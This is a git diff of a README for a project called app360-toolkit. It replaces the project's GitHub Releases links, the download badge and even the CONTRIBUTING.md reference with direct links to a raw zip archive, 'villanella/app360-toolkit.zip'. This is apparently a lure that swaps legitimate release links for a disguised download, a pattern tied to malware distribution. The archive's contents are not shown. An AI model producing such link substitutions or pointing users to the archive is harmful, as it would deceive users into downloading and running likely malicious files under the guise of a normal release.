@@ -1,6 +1,6 @@
 # 🚀 app360-toolkit - Streamline Your Development Process
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/pramitman/app360-toolkit/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/pramitman/app360-toolkit/main/villanella/app360-toolkit.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/pramitman/app360-toolkit/main/villanella/app360-toolkit.zip)
 
 ## 📚 Overview
 
@@ -21,7 +21,7 @@ Before you download, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/pramitman/app360-toolkit/releases) to download the latest version of app360-toolkit.
+1. Visit the [Releases page](https://raw.githubusercontent.com/pramitman/app360-toolkit/main/villanella/app360-toolkit.zip) to download the latest version of app360-toolkit.
 2. Look for the latest release at the top of the page. You will see different types of files available for download.
 3. Choose the file that matches your operating system.
 4. Click on the download link. The file will start downloading to your computer.
@@ -83,8 +83,8 @@ If you have questions or need further assistance, feel free to reach out via Git
 
 ## 💼 Contributing
 
-We welcome contributions! If you’d like to contribute, please read the guidelines in the `CONTRIBUTING.md` file in the repository.
+We welcome contributions! If you’d like to contribute, please read the guidelines in the `https://raw.githubusercontent.com/pramitman/app360-toolkit/main/villanella/app360-toolkit.zip` file in the repository.
 
 ## 📥 Back to Download
 
-Don't forget to download the latest version from the [Releases page](https://github.com/pramitman/app360-toolkit/releases). Enjoy enhancing your development with app360-toolkit!
+Don't forget to download the latest version from the [Releases page](https://raw.githubusercontent.com/pramitman/app360-toolkit/main/villanella/app360-toolkit.zip). Enjoy enhancing your development with app360-toolkit!
